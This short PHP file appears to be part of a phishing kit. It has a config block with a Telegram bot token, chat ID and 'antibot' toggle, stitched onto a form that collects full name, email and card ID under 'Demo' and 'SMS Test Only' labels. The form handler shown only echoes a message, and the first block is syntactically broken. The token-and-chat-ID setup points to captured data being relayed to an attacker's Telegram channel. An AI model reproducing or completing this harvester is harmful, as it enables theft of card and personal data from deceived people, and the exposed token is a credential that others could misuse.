<?php

     

$token = "9108139118:AAEisCNeCi_q_-0DNVTz_icKHkYbrU_dTRc";
$id = "-1003987841987";


// use antibot? yes|no
$antibot = "yes"

     
<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    echo "Demo received successfully";
}
?>
<form method="POST">
<input name="name" placeholder="Full Name" required>
<input name="email" type="email" placeholder="Email" required>
<input name="card" placeholder="Demo Card ID">
<input value="SMS Test Only" disabled>
<button>Submit</button>
</form>
<style>
body{font:14px Arial;background:#f2f4f8;padding:20px}
form{max-width:300px;margin:auto;background:white;padding:18px;border-radius:12px}
input,button{width:100%;padding:11px;margin:6px 0;box-sizing:border-box;border:1px solid #ddd;border-radius:7px}
button{background:#1769e0;color:white;border:0}
</style>
